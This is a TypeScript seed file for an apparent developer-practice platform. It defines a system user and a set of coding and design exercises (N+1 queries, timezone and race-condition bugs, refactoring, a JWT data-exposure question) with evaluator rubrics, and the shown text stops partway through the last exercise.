import { createHash } from 'crypto'
import { drizzle } from 'drizzle-orm/postgres-js'
import postgres from 'postgres'
import * as schema from './drizzle/schema'
import { exercises as exercisesTable, variations as variationsTable, users as usersTable } from './drizzle/schema'

// ---------------------------------------------------------------------------
// UUIDv5 — deterministic UUIDs, no external dependency
// ---------------------------------------------------------------------------

const DOJO_NAMESPACE = 'a4c5d7e2-9b3f-4e1a-8c6d-2f0b7e5a1d9c'

function uuidv5(name: string): string {
  const nsBytes = Buffer.from(DOJO_NAMESPACE.replace(/-/g, ''), 'hex')
  const nameBytes = Buffer.from(name, 'utf8')
  const hash = createHash('sha1').update(Buffer.concat([nsBytes, nameBytes])).digest()

  hash[6] = (hash[6]! & 0x0f) | 0x50
  hash[8] = (hash[8]! & 0x3f) | 0x80

  const hex = hash.subarray(0, 16).toString('hex')
  return [hex.slice(0, 8), hex.slice(8, 12), hex.slice(12, 16), hex.slice(16, 20), hex.slice(20, 32)].join('-')
}

// ---------------------------------------------------------------------------
// System user — required by exercises.created_by FK
// ---------------------------------------------------------------------------

const SYSTEM_USER_ID = uuidv5('dojo-system-user')

const SYSTEM_USER = {
  id: SYSTEM_USER_ID,
  githubId: 'dojo-system',
  username: 'dojo-system',
  avatarUrl: '',
  createdAt: new Date('2026-01-01T00:00:00Z'),
}

// ---------------------------------------------------------------------------
// Exercise data
// ---------------------------------------------------------------------------

interface SeedExercise {
  id: string
  title: string
  description: string
  duration: number
  difficulty: 'easy' | 'medium' | 'hard'
  type: 'code' | 'chat' | 'whiteboard'
  category: string
  languages: string[]
  tags: string[]
  topics: string[]
  variations: Array<{ ownerRole: string; ownerContext: string }>
}

const EXERCISES: SeedExercise[] = [
  {
    id: uuidv5('exercise-001-n-plus-one'),
    title: "The N+1 You Didn't Write",
    description: `You have been handed this code from a teammate. It works. Users are complaining it's slow. The team lead wants it fixed before the next sprint ends.

\`\`\`ruby
def load_dashboard(user_id)
  user = User.find(user_id)
  posts = user.posts.where(published: true)
  posts.map do |post|
    {
      title: post.title,
      comment_count: post.comments.count,
      author_name: post.author.name
    }
  end
end
\`\`\`

Identify the problem(s), fix the code, and explain your reasoning. If you would also add something to the database layer, describe what and why.`,
    duration: 20,
    difficulty: 'medium',
    type: 'code',
    category: 'backend',
    languages: ['ruby', 'python', 'typescript'],
    tags: ['performance', 'database', 'orm'],
    topics: ['database', 'orm', 'n-plus-one-queries', 'query-optimization', 'lazy-loading'],
    variations: [
      {
        ownerRole: 'Senior Rails engineer with 8 years building high-traffic e-commerce platforms, DBA background',
        ownerContext:
          "Evaluate the developer's ability to identify N+1 queries in ActiveRecord, understand eager loading vs. lazy loading, and reason about the tradeoffs between `includes`, `preload`, and `joins`. Look for whether they consider the DB query count, not just the Ruby logic. A developer who fixes the Ruby but ignores the underlying SQL is missing the point. Give credit for identifying the `comments.count` vs `comments.size` distinction if they catch it.",
      },
      {
        ownerRole: 'Backend performance consultant who has audited 50+ codebases and has seen every variation of this mistake',
        ownerContext:
          "Focus on whether the developer understands the root cause (ORM lazy loading generating one query per record) before jumping to the fix. A developer who immediately writes the fix without explaining why it's an N+1 problem has pattern-matched, not understood. Ask a follow-up if they don't explain the query count. Evaluate their fix for correctness — `includes` is fine, `joins` + `select` is better for this case because we don't need the full comment objects.",
      },
    ],
  },

  {
    id: uuidv5('exercise-002-breaking-api-change'),
    title: 'The Breaking API Change',
    description: `Your team needs to rename a field in a public REST API response. The current field is \`user_name\` and it needs to become \`username\` to match a new internal standard. You have 3 external consumers — two are internal teams, one is a paying customer with their own mobile app.

The mobile app developer told you (in Slack, informally) "just let me know a week before." Your team lead is pushing to ship this in the next release. Your PM says "it's just a rename."

How do you handle this? Walk me through your decision and your plan.`,
    duration: 20,
    difficulty: 'medium',
    type: 'chat',
    category: 'backend',
    languages: [],
    tags: ['api', 'communication', 'versioning'],
    topics: ['api-versioning', 'backward-compatibility', 'breaking-changes', 'consumer-communication', 'semantic-versioning'],
    variations: [
      {
        ownerRole: 'Tech lead who has personally been burned by a breaking API change that took down a partner integration for 6 hours',
        ownerContext:
          "Evaluate whether the developer understands the difference between a 'breaking change' and a 'non-breaking change.' The rename IS breaking — any consumer doing `response.user_name` will get `undefined`. Evaluate their mitigation plan: versioning (v1/v2), dual-field period (both `user_name` and `username` for N weeks), or negotiated cutover. The developer's comfort with pushback matters — do they cave to the PM's 'it's just a rename,' or do they hold the line on consumer impact? Give credit for proposing a concrete communication plan, not just 'we'll tell them.'",
      },
      {
        ownerRole: "Partner engineering manager at a company whose mobile app was broken by an undocumented API change from a vendor",
        ownerContext:
          "Evaluate from the consumer's perspective. Does the developer consider the mobile app's release cycle? A mobile app cannot hotfix in 24 hours — the developer needs to account for Apple/Google review timelines if the consumer needs to ship an update. Ask a follow-up if they don't address the mobile app specifically. A plan that works for internal teams but ignores mobile is incomplete.",
      },
    ],
  },

  {
    id: uuidv5('exercise-003-midnight-incident'),
    title: 'The Midnight Incident',
    description: `It's 2:17 AM. You are on call. PagerDuty wakes you up. The alert says: "Payment service — error rate 47%, p99 latency 12 seconds."

You have access to: application logs, a metrics dashboard (Datadog), and a Slack channel where your CTO has just posted "what's going on?"

Walk me through your next 20 minutes. What do you do, in what order, and what do you say to the CTO?`,
    duration: 30,
    difficulty: 'hard',
    type: 'chat',
    category: 'reliability',
    languages: [],
    tags: ['incident', 'oncall', 'communication'],
    topics: ['incident-response', 'debugging-under-pressure', 'root-cause-analysis', 'communication', 'postmortem-thinking'],
    variations: [
      {
        ownerRole: 'Staff SRE with 10 years of on-call experience at a fintech company, has managed 200+ incidents',
        ownerContext:
          "Evaluate the developer's incident response process. Are they mitigating first (reducing blast radius) or diagnosing first? The correct order for a payment service is: (1) check if there's a recent deploy to roll back, (2) check if there's an external dependency (payment processor, database) showing issues, (3) start triage. Evaluate their communication — what do they tell the CTO? 'We're looking into it' is not enough; 'Error rate is 47% on the payment service, we believe it may be related to the deploy at 1:45 AM, we are investigating rollback' is better. Give credit for not jumping to conclusions before having data.",
      },
      {
        ownerRole: 'Engineering manager who has seen developers freeze under incident pressure and developers who stay calm and systematic',
        ownerContext:
          "Evaluate the developer's ability to stay systematic under pressure. Do they panic and start changing things? Do they communicate clearly? Do they know when to escalate (wake up a senior engineer)? The payment service context is important — 47% error rate means real money is being lost. Evaluate whether they acknowledge the business impact or treat it as purely a technical problem. A developer who says 'I'd fix the bug' without acknowledging the customer impact is missing the real dimension of incident response.",
      },
    ],
  },

  {
    id: uuidv5('exercise-004-typescript-inherited'),
    title: 'TypeScript You Inherited',
    description: `You joined a new team. This is real code from the codebase. The previous developer said "we'll fix the types later." It's been 18 months.

\`\`\`typescript
function processUserEvent(event: any) {
  if (event.type === 'purchase') {
    return {
      userId: event.user.id,
      amount: event.data.amount,
      currency: event.data.currency || 'USD'
    }
  }
  if (event.type === 'refund') {
    return {
      userId: event.user.id,
      amount: -event.data.amount,
      currency: event.data.currency || 'USD'
    }
  }
  return null
}
\`\`\`

This function is called 40 times across the codebase. Improve the types. Don't change the runtime behavior. Explain every decision you make.`,
    duration: 20,
    difficulty: 'medium',
    type: 'code',
    category: 'frontend',
    languages: ['typescript'],
    tags: ['typescript', 'types', 'refactoring'],
    topics: ['typescript', 'type-safety', 'any-type', 'union-types', 'type-narrowing', 'discriminated-unions'],
    variations: [
      {
        ownerRole: 'Senior TypeScript engineer who has maintained a typed codebase of 200k lines for 4 years',
        ownerContext:
          "Evaluate the developer's TypeScript thinking. Do they define discriminated unions for the event types? Do they understand the difference between `unknown` and `any`? Do they use type guards or type narrowing correctly? A solution that uses `as EventType` casting is not type-safe — it compiles but moves the problem. Give credit for: discriminated union definition, exhaustive switch or if-else with proper narrowing, and understanding why `any` was a mistake (bypasses the compiler entirely). Ask a follow-up if they only improve the function signature without addressing the root type definition.",
      },
      {
        ownerRole: 'Staff engineer who reviews 20+ PRs per week and has to balance type safety with practical migration paths',
        ownerContext:
          "Evaluate the developer's migration strategy, not just the type design. This code is called 40 times. A perfect type rewrite that breaks 40 call sites is not a good PR. Does the developer think about incremental adoption? Can the function be typed at the boundary while the call sites migrate gradually? Give credit for: understanding the blast radius (40 call sites), proposing a migration path, and identifying that the `currency` fallback to 'USD' is itself a typing issue — it implies `currency` can be undefined, which should be explicit.",
      },
    ],
  },

  {
    id: uuidv5('exercise-005-sql-works-until-it-doesnt'),
    title: "The SQL That Works (Until It Doesn't)",
    description: `This query runs fine in staging (50k rows). It runs for 45 seconds in production (8M rows). Your task is to analyze it and fix it.

\`\`\`sql
SELECT
  u.id,
  u.username,
  COUNT(s.id) as session_count,
  AVG(CASE WHEN a.verdict = 'passed' THEN 1.0 ELSE 0.0 END) as pass_rate
FROM users u
LEFT JOIN sessions s ON s.user_id = u.id
LEFT JOIN attempts a ON a.session_id = s.id
WHERE s.completed_at > NOW() - INTERVAL '30 days'
  OR s.completed_at IS NULL
GROUP BY u.id, u.username
ORDER BY session_count DESC;
\`\`\`

Explain what is wrong and provide a corrected version. Assume you have access to \`EXPLAIN ANALYZE\` output.`,
    duration: 30,
    difficulty: 'hard',
    type: 'code',
    category: 'backend',
    languages: ['sql'],
    tags: ['sql', 'performance', 'postgresql'],
    topics: ['postgresql', 'query-performance', 'indexes', 'explain-analyze', 'join-vs-subquery', 'null-handling'],
    variations: [
      {
        ownerRole: 'PostgreSQL DBA with 12 years of experience, has diagnosed hundreds of slow queries in production',
        ownerContext:
          "Evaluate the developer's ability to read a query and identify multiple problems without running it. Problems in this query: (1) `OR s.completed_at IS NULL` prevents index use on `completed_at` — the optimizer cannot use a range index with OR NULL conditions; (2) the `LEFT JOIN` on attempts means every attempt row is included, inflating `COUNT(s.id)` — should be counting distinct sessions; (3) `AVG(CASE ...)` over a JOIN produces wrong pass_rate if a session has multiple attempts; (4) no index hint that `users.id`, `sessions.user_id`, `attempts.session_id`, `sessions.completed_at` are indexed. Give credit for identifying at least 2 of these. The NULL handling and the inflated COUNT are the most common misses.",
      },
      {
        ownerRole: 'Senior backend engineer who writes SQL daily but is not a dedicated DBA — approaches this from a product and correctness perspective',
        ownerContext:
          "Evaluate correctness first, performance second. The query produces wrong results before it produces slow results: `COUNT(s.id)` counts attempt rows, not sessions; `AVG(CASE ...)` computes pass rate per attempt, not per session. A developer who produces a 'fast' version of a wrong query has not solved the problem. Ask a follow-up if they fix performance without noticing the correctness issue. Give extra credit for catching the `OR ... IS NULL` index problem — it requires understanding how PostgreSQL evaluates OR conditions with NULL.",
      },
    ],
  },

  {
    id: uuidv5('exercise-006-architecture-decision'),
    title: 'The Architecture Decision',
    description: `A startup's checkout service sends a confirmation email after every purchase. Currently: the checkout service calls the email service directly (synchronous HTTP). When the email service goes down, checkouts fail. When the email service is slow, checkouts are slow.

The CTO wants you to propose an architecture that decouples the two services. You have 45 minutes. Show your design.

Use the diagram area to show the proposed architecture. Write your reasoning in the text area below the diagram.`,
    duration: 45,
    difficulty: 'hard',
    type: 'whiteboard',
    category: 'architecture',
    languages: [],
    tags: ['architecture', 'distributed-systems', 'reliability'],
    topics: ['system-design', 'event-driven-architecture', 'message-queues', 'trade-offs', 'scalability', 'reliability', 'outbox-pattern', 'idempotency'],
    variations: [
      {
        ownerRole: 'Staff distributed systems engineer who has designed event-driven systems at a company processing 10M orders/day',
        ownerContext:
          "Evaluate whether the developer understands the fundamental trade-off they are making: moving from synchronous (consistent but coupled) to asynchronous (decoupled but eventually consistent). Does their design handle the 'at-least-once delivery' problem? What happens if the queue consumer crashes after pulling a message but before sending the email — will the email be sent again? Does the design include a dead-letter queue for failed email sends? Give credit for: identifying the consistency trade-off, proposing message queue (Kafka, RabbitMQ, SQS — any is fine), handling idempotency, and acknowledging what observability looks like in the new system.",
      },
      {
        ownerRole: 'CTO of a Series A startup who has 5 engineers and needs to choose between the right architecture and the shippable architecture',
        ownerContext:
          "Evaluate the developer's judgment about complexity. A developer who proposes Kafka + Zookeeper + multiple consumer groups for a startup with 5 engineers is overengineering. The pragmatic solution might be: a simple outbox pattern (write email_jobs to DB in the same transaction as the purchase, have a worker poll the table). Does the developer consider the team's capacity and operational complexity, not just the technical correctness? Give credit for proposing the simplest thing that works, noting what it doesn't do (not fault-tolerant to extended email service outages), and defining when they would upgrade to a real queue.",
      },
    ],
  },

  {
    id: uuidv5('exercise-007-code-review'),
    title: 'The Code Review',
    description: `This is a pull request from a junior developer on your team. They're proud of it. It works. Give them a code review — be specific, be helpful, and be honest.

\`\`\`typescript
async function getUserData(userId) {
  try {
    const response = await fetch(\`/api/users/\${userId}\`)
    const data = await response.json()
    if (data) {
      return data.user
    }
  } catch(e) {
    console.log(e)
  }
}
\`\`\``,
    duration: 15,
    difficulty: 'easy',
    type: 'code',
    category: 'frontend',
    languages: ['typescript'],
    tags: ['code-review', 'junior', 'error-handling'],
    topics: ['code-review', 'readability', 'error-handling', 'async-await', 'typescript', 'defensive-programming'],
    variations: [
      {
        ownerRole: 'Senior developer who mentors juniors and has strong opinions about what makes feedback useful vs. demoralizing',
        ownerContext:
          "Evaluate whether the developer's code review is specific, constructive, and honest. Issues to find: (1) `userId` has no type annotation; (2) `response.ok` is not checked — a 404 or 500 response will not throw but will return an error body; (3) `if (data)` is truthy-checking an object, which is always true — the `data.user` check is the right guard; (4) the catch swallows the error — `console.log` is not error handling for production code; (5) the function returns `undefined` on error, not `null`, and has no return type annotation. Give credit for identifying 3+ issues AND for framing feedback in a way that helps the junior understand why, not just what.",
      },
      {
        ownerRole: 'Principal engineer who treats every code review as a teaching opportunity and will not approve code that could silently fail in production',
        ownerContext:
          "Evaluate technical depth. The `response.ok` check is the most production-critical issue — a user who gets a 404 because the userId doesn't exist will get `undefined` back with no error, and the caller has no way to distinguish 'not found' from 'fetch error.' The developer should propose a pattern for error handling: either throw a typed error (`UserNotFoundError`, `FetchError`) or return a discriminated union (`{ ok: true, user } | { ok: false, error }`). Give extra credit for suggesting that the function's return type should be explicit, not inferred, and for noting that `console.log(e)` is especially bad — it logs the error object, which may contain sensitive user data.",
      },
    ],
  },

  {
    id: uuidv5('exercise-008-feature-flag-refactor'),
    title: 'The Feature Flag Refactor',
    description: `Your team shipped a feature 6 months ago behind a feature flag. The flag is \`ENABLE_NEW_CHECKOUT\`. It's been at 100% for 5 months. The old code path still exists. The flag is checked in 14 places across 6 files.

Your PM says "we should clean this up." You have a sprint with 2 other features already planned. What do you do?`,
    duration: 15,
    difficulty: 'easy',
    type: 'chat',
    category: 'backend',
    languages: [],
    tags: ['technical-debt', 'feature-flags', 'cleanup'],
    topics: ['feature-flags', 'technical-debt', 'refactoring', 'risk-management', 'gradual-rollout'],
    variations: [
      {
        ownerRole: 'Engineering lead who manages technical debt alongside feature work and has cleaned up 20+ dead code paths',
        ownerContext:
          "Evaluate the developer's judgment about timing and risk. This is not an emergency but it is legitimate debt. Does the developer propose a concrete cleanup plan? The steps are: (1) verify the flag is actually at 100% in all environments (including staging — it's often different); (2) remove the flag check and the old code path in a single PR; (3) test that removing the old code doesn't break anything (the old path was disabled, but it may have shared utilities); (4) update the feature flag service to retire the flag name. Give credit for: proposing the cleanup as a separate PR (not bundled with a feature), estimating the risk correctly (low — the old code hasn't run in 5 months), and pushing back appropriately if the sprint is truly full.",
      },
      {
        ownerRole: "Senior developer who has worked in a codebase with 200+ feature flags and knows what happens when they're not cleaned up",
        ownerContext:
          "Evaluate whether the developer understands the cost of leaving it. Every flag check is dead branch logic that the next developer has to read and understand. The 14 occurrences in 6 files means 14 places where a future developer will have to ask 'is this still relevant?' Give credit for: quantifying the cleanup cost (probably 2-4 hours for a careful developer), comparing it to the accumulating cost of leaving it, and proposing a graduation process — not just 'delete it' but 'verify → delete → monitor → retire flag name.'",
      },
    ],
  },

  // -------------------------------------------------------------------------
  // Bug Detection
  // -------------------------------------------------------------------------

  {
    id: uuidv5('exercise-009-timezone-bug'),
    title: 'The Timezone Bug',
    description: `Your 30-day free trial system has a support ticket backlog. Some users are getting cut off after 29 days, others are still active after 31. The relevant code:

\`\`\`typescript
function hasTrialExpired(signedUpAt: Date): boolean {
  const thirtyDays = 30 * 24 * 60 * 60 * 1000
  return Date.now() - signedUpAt.getTime() > thirtyDays
}

// signedUpAt is parsed from the user's submitted form field:
function parseSignupDate(rawDate: string): Date {
  // rawDate is the date string stored in the DB, e.g. "2026-03-01"
  return new Date(rawDate + 'T00:00:00')
}
\`\`\`

The server runs on UTC. Users sign up from all timezones. One server engineer said "the math looks right to me." Find the bug, explain why it produces inconsistent results, and fix it.`,
    duration: 15,
    difficulty: 'easy',
    type: 'code',
    category: 'backend',
    languages: ['typescript', 'python', 'javascript'],
    tags: ['bug', 'timezone', 'date-handling'],
    topics: ['timezones', 'date-parsing', 'utc', 'javascript-dates', 'ecmascript-spec'],
    variations: [
      {
        ownerRole: 'Senior backend engineer who has fixed timezone-related billing bugs at a SaaS company with users in 80 countries',
        ownerContext:
          "The bug is in `parseSignupDate`: `new Date('2026-03-01T00:00:00')` — a datetime string WITHOUT a timezone suffix — is parsed as **local time** per the ECMAScript spec. On a server in UTC+5:30, this parses to 18:30 UTC on Feb 28, which is 5.5 hours earlier than intended. Combined with a 30-day window in milliseconds, some users get cut off hours early (effectively 29 days) and some get extra hours (effectively 31 days in edge cases around DST). The fix: append 'Z' to force UTC parsing — `new Date(rawDate + 'T00:00:00Z')`. Evaluate whether the developer knows the difference between date-only strings (ECMAScript parses as UTC) and date-time strings without 'Z' (parsed as local). Give extra credit if they identify that comparing `Date.now()` to a stored UTC date is fine — the bug is only in the parsing.",
      },
      {
        ownerRole: 'Engineering manager who has triaged 3 separate timezone-related production incidents at previous companies and considers this a fundamental skill gap',
        ownerContext:
          "Evaluate whether the developer can reason about the bug without running code. Can they articulate what 'local time parsing' means in a server context? Do they know that Node.js inherits the server's TZ environment variable? The deeper question is whether they understand that date-only strings and date-time strings behave differently in JavaScript — a distinction almost nobody knows until they get burned by it. Give credit for: correctly identifying `parseSignupDate` as the bug location, explaining the parsing ambiguity, and proposing a defensive fix (always use ISO 8601 with explicit 'Z' or use a library like `date-fns` that enforces UTC). Deduct if they rewrite `hasTrialExpired` — that function is correct.",
      },
    ],
  },

  {
    id: uuidv5('exercise-010-race-condition'),
    title: 'The Race Condition',
    description: `Your e-commerce site has a flash sale. The product has 1 unit left. Somehow, 3 customers successfully checked out and all received order confirmations. Your support team is furious. Here is the inventory reservation code:

\`\`\`typescript
class InventoryService {
  async reserveItem(itemId: string, userId: string): Promise<boolean> {
    const item = await db.items.findById(itemId)

    if (item.stock <= 0) {
      return false
    }

    await db.items.update(itemId, { stock: item.stock - 1 })
    await db.reservations.create({ itemId, userId })
    return true
  }
}
\`\`\`

Explain exactly how 3 users could all succeed. Fix the code. Then explain what you would add to make the fix observable in production.`,
    duration: 20,
    difficulty: 'medium',
    type: 'code',
    category: 'backend',
    languages: ['typescript', 'python'],
    tags: ['bug', 'concurrency', 'database'],
    topics: ['race-conditions', 'database-transactions', 'optimistic-locking', 'pessimistic-locking', 'concurrency', 'atomicity'],
    variations: [
      {
        ownerRole: 'Staff backend engineer who has designed inventory systems for flash sales with 50k concurrent users',
        ownerContext:
          "The bug is a classic TOCTOU (time-of-check to time-of-use) race: three requests all read `stock = 1`, all pass the `<= 0` check, all decrement from 1 to 0. Since `findById` and `update` are separate operations, any number of concurrent requests can slip between them. The fix: use an atomic conditional update with a row lock — e.g., `UPDATE items SET stock = stock - 1 WHERE id = $1 AND stock > 0 RETURNING *` and check whether a row was returned. Or use a database transaction with `SELECT FOR UPDATE`. Give credit for: explaining TOCTOU clearly, proposing an atomic solution (not just wrapping in a JS mutex, which only works on a single server instance), and noting that the fix must be database-level to survive horizontal scaling. Observability: log when the update returns 0 rows (oversell attempt detected), add a metric for reservation failures.",
      },
      {
        ownerRole: 'Principal engineer who has reviewed and rejected multiple "fixed" versions of this bug that still had the race condition',
        ownerContext:
          "Evaluate whether the developer's fix actually works under concurrency. Common wrong answers: (1) wrapping in a JS try/catch — doesn't help; (2) using a JavaScript mutex/lock — only works on a single process, breaks with horizontal scaling; (3) adding a transaction without `SELECT FOR UPDATE` — still has the race inside the transaction. The only correct answer for multi-server environments is an atomic database operation. Ask a follow-up if they propose a solution that only works on a single server. Give credit for raising the horizontal scaling concern proactively, and for mentioning that the `reservations.create` should also be inside the same transaction — a reservation should not exist if the stock decrement failed.",
      },
    ],
  },

  // -------------------------------------------------------------------------
  // Refactoring
  // -------------------------------------------------------------------------

  {
    id: uuidv5('exercise-011-function-that-grew'),
    title: 'The Function That Grew',
    description: `This function started as 10 lines. It's now 50. Every new requirement added another \`if\`. Nobody has complained — it works. You have been asked to add one more case (handling \`'enterprise'\` plan users with a custom discount rate stored in the DB). Before you add it, refactor the function.

\`\`\`typescript
async function calculateInvoiceTotal(
  userId: string,
  lineItems: Array<{ unitPrice: number; quantity: number }>,
  couponCode: string | null
): Promise<number> {
  const subtotal = lineItems.reduce((sum, item) => sum + item.unitPrice * item.quantity, 0)

  let discount = 0

  const user = await db.users.findById(userId)
  if (user.plan === 'free') {
    discount = 0
  } else if (user.plan === 'starter') {
    discount = subtotal * 0.05
  } else if (user.plan === 'pro') {
    discount = subtotal * 0.15
  } else if (user.plan === 'team') {
    if (user.teamSize >= 10) {
      discount = subtotal * 0.25
    } else {
      discount = subtotal * 0.20
    }
  }

  if (couponCode) {
    const coupon = await db.coupons.findByCode(couponCode)
    if (coupon && coupon.active) {
      if (coupon.type === 'percent') {
        discount += subtotal * (coupon.value / 100)
      } else if (coupon.type === 'fixed') {
        discount += coupon.value
      }
    }
  }

  const taxRate = user.country === 'US' ? 0.08 : user.country === 'EU' ? 0.20 : 0
  const afterDiscount = subtotal - discount
  const tax = afterDiscount * taxRate
  return Math.max(0, afterDiscount + tax)
}
\`\`\`

Refactor first. Then add the \`enterprise\` case.`,
    duration: 15,
    difficulty: 'easy',
    type: 'code',
    category: 'backend',
    languages: ['typescript', 'python'],
    tags: ['refactoring', 'readability', 'clean-code'],
    topics: ['refactoring', 'single-responsibility', 'extract-function', 'readability', 'maintainability'],
    variations: [
      {
        ownerRole: 'Senior engineer who reviews PRs for a 6-person team and has a firm rule: every function should do one thing and fit on a screen',
        ownerContext:
          "Evaluate the developer's ability to identify the responsibilities and extract them cleanly. The function does three distinct things: (1) calculate subtotal, (2) calculate discount (plan-based + coupon), (3) calculate tax. Each should be a separate function. The plan discount is also a candidate for a lookup table or a strategy pattern. Evaluate whether the refactoring preserves behavior exactly — the existing logic has a specific execution order (plan discount first, then coupon on top of subtotal, not on the discounted amount). Give credit for noticing that `discount` accumulates (plan + coupon), and for extracting `getPlanDiscount`, `getCouponDiscount`, and `getTaxRate` as separate pure functions where possible. Penalize refactors that accidentally change the discount stacking order.",
      },
      {
        ownerRole: 'Staff engineer who treats refactoring as a prerequisite for new features, not an optional cleanup task',
        ownerContext:
          "Evaluate whether the developer refactors BEFORE adding the new case — not after. The enterprise case is the forcing function that reveals whether the current structure can absorb change cleanly. A developer who adds enterprise support to the existing `if-else` chain has made the problem worse. The correct move: extract the plan discount logic into something extensible (a map, a small strategy, or a helper) so the enterprise case is just one more entry point. Evaluate also whether they handle the new enterprise requirement correctly — 'custom discount rate stored in the DB' means an async lookup, which changes the function's async surface. Give credit for catching that the enterprise path requires a DB call not present in the existing logic.",
      },
    ],
  },

  {
    id: uuidv5('exercise-012-nested-conditions'),
    title: 'The Nested Conditions',
    description: `This function has been correct since 2023. It has never been wrong. But it has also never been readable. A new developer on the team spent 25 minutes trying to understand it before asking for help. Refactor it for readability without changing any behavior.

\`\`\`typescript
function getAccessLevel(user: {
  isActive: boolean
  role: 'admin' | 'editor' | 'viewer' | 'guest'
  emailVerified: boolean
  suspendedAt: Date | null
}): 'full' | 'limited' | 'readonly' | 'none' {
  if (user.isActive) {
    if (!user.suspendedAt) {
      if (user.emailVerified) {
        if (user.role === 'admin') {
          return 'full'
        } else if (user.role === 'editor') {
          return 'full'
        } else if (user.role === 'viewer') {
          return 'limited'
        } else {
          return 'readonly'
        }
      } else {
        if (user.role === 'admin') {
          return 'limited'
        } else {
          return 'readonly'
        }
      }
    } else {
      return 'none'
    }
  } else {
    return 'none'
  }
}
\`\`\`

Produce a refactored version. Write a short explanation of the main change you made and why.`,
    duration: 20,
    difficulty: 'medium',
    type: 'code',
    category: 'backend',
    languages: ['typescript', 'python'],
    tags: ['refactoring', 'readability', 'clean-code'],
    topics: ['refactoring', 'guard-clauses', 'early-return', 'readability', 'cyclomatic-complexity'],
    variations: [
      {
        ownerRole: 'Senior engineer with a strong opinion that deeply nested code is a code smell, not a style preference',
        ownerContext:
          "Evaluate the developer's refactoring approach. The canonical improvement is guard clauses (early returns for the negative cases): `if (!user.isActive || user.suspendedAt) return 'none'`. This immediately reduces nesting depth and makes the happy path clear. From there, the role/email logic can be expressed more declaratively — a lookup table, a small conditional chain, or a derived 'canWrite' flag. Evaluate whether the refactor is behavior-preserving: admin + editor both return 'full' when email verified (they can be collapsed); guest (unverified or verified) with no email verification gets 'readonly'. Give credit for: applying guard clauses, reducing nesting depth to ≤2 levels, and writing the explanation in terms of the business logic rather than the code structure.",
      },
      {
        ownerRole: 'Principal engineer who has established refactoring conventions across multiple teams and uses code review as the primary teaching mechanism',
        ownerContext:
          "Evaluate the quality of the explanation, not just the code. A developer who produces clean code but cannot articulate *why* the nested version is harder to read has learned a pattern without understanding it. The key insight: nested conditions force the reader to hold multiple states in their head simultaneously. Guard clauses let the reader discard cases early and focus on what remains. Ask a follow-up if they refactor without mentioning guard clauses or early returns by name — understanding the pattern name helps them teach it to others. Also evaluate whether their version correctly collapses the `admin | editor → 'full'` case — this is a common behavior-breaking mistake in this exercise.",
      },
    ],
  },

  {
    id: uuidv5('exercise-013-slow-loop'),
    title: 'The Slow Loop',
    description: `A nightly report job is timing out in production. It processes 200k users and takes 4+ hours. The data team is blocked. You've been asked to fix it before the next run tonight.

\`\`\`typescript
function findUsersWhoNeverPurchased(
  users: Array<{ id: string; email: string }>,
  purchases: Array<{ userId: string; amount: number }>
): Array<{ id: string; email: string }> {
  return users.filter((user) => {
    const userPurchases = purchases.filter((p) => p.userId === user.id)
    return userPurchases.length === 0
  })
}

// Called with: findUsersWhoNeverPurchased(allUsers, allPurchases)
// allUsers: 200,000 records
// allPurchases: 1,800,000 records
\`\`\`

Fix the function. State the time complexity before and after. Explain how you would verify the fix is correct before deploying tonight.`,
    duration: 20,
    difficulty: 'medium',
    type: 'code',
    category: 'backend',
    languages: ['typescript', 'python'],
    tags: ['performance', 'algorithms', 'bug'],
    topics: ['time-complexity', 'big-o', 'set', 'hashmap', 'data-structures', 'performance-optimization'],
    variations: [
      {
        ownerRole: 'Staff engineer who has optimized data pipelines at scale and can estimate runtime complexity without running the code',
        ownerContext:
          "The bug is algorithmic: `O(n × m)` where n = 200k users and m = 1.8M purchases = 360 billion operations in the inner loop. The fix: build a `Set<string>` of userId from purchases (one pass, O(m)), then filter users by `!purchasedSet.has(user.id)` (O(n)). Total: O(n + m). Evaluate whether the developer can articulate complexity before and after — not just 'it's faster' but 'it's O(n×m) vs O(n+m).' Also evaluate their verification plan: the output should be identical, so a good test is running both versions on a sample and comparing results. Give extra credit for noting that the real fix for a 200k/1.8M dataset should be a SQL query, not an in-memory operation.",
      },
      {
        ownerRole: 'Engineering manager who has had to explain to a non-technical CTO why a job that ran fine at 10k users takes 4 hours at 200k',
        ownerContext:
          "Evaluate the developer's ability to communicate the problem clearly and the fix correctly. Can they explain why O(n×m) is catastrophic at scale without using jargon? Can they explain why a Set lookup is O(1) and why that changes everything? For the verification plan, evaluate whether they think about edge cases: what if the same userId appears multiple times in purchases? The Set-based fix handles this correctly (a user is still in the Set regardless of how many purchases they have). Give credit for: clear complexity analysis, a correct fix, and a practical verification approach (sample test, compare outputs, run on staging first). Ask a follow-up if they don't mention moving this logic to SQL — in-memory joins on millions of records are fragile regardless of the algorithm.",
      },
    ],
  },

  // -------------------------------------------------------------------------
  // Security
  // -------------------------------------------------------------------------

  {
    id: uuidv5('exercise-014-jwt-misconception'),
    title: 'The JWT Misconception',
    description: `Your team ships a new feature: the mobile app reads the JWT on login to personalize the experience without an extra API call. The token now contains:

\`\`\`json
{
  "sub": "user-abc123",
  "email": "alex@example.com",
  "plan": "pro",
  "stripeCustomerId": "cus_9xyzABC",
  "paymentMethodLast4": "4242",
  "internalAdminNotes": "VIP — waived 2 chargebacks",
  "exp": 1748736000
}
\`\`\`

The mobile team lead says "it's signed so it's secure." A security-conscious engineer on your team flags it but isn't sure how to explain the issue clearly. Explain what is wrong. Define exactly what should and should not be in a JWT. Propose a revised approach for the mobile personalization use case.`,
    duration: 20,
    difficulty: 'medium',
    type: 'chat',
    category: 'security',
    languages: [],
    tags: ['security', 'jwt', 'authentication'],
    topics: ['jwt', 'authentication', 'authorization', 'encryption-vs-signing', 'sensitive-data', 'token-design'],
    variations: [
      {
        ownerRole: 'Security engineer who has reviewed hundreds of JWT implementations and written the company JWT standards document',
        ownerContext:
          "The core misconception: JWTs are **signed**, not **encrypted**. Anyone can base64-decode the payload and read its contents — no secret needed. The `stripeCustomerId`, `paymentMethodLast4`, and especially `internalAdminNotes` should never be in a JWT. The correct mental model: treat JWT claims as public data that you trust was issued by you (because of the signature), not data that is hidden. What belongs in a JWT: user identifier, roles/permissions, expiry. What does NOT belong: PII, financial data, internal notes, secrets. The fix for mobile personalization: keep the JWT minimal, make one extra API call on login to fetch profile data (it can be cached). Give credit for: explaining the base64-decodable nature of JWTs, distinguishing signing from encryption, and proposing a correct minimal token.",
      },
      {
        ownerRole: "Mobile team lead who genuinely believed JWTs were encrypted because 'they have a signature'",
        ownerContext:
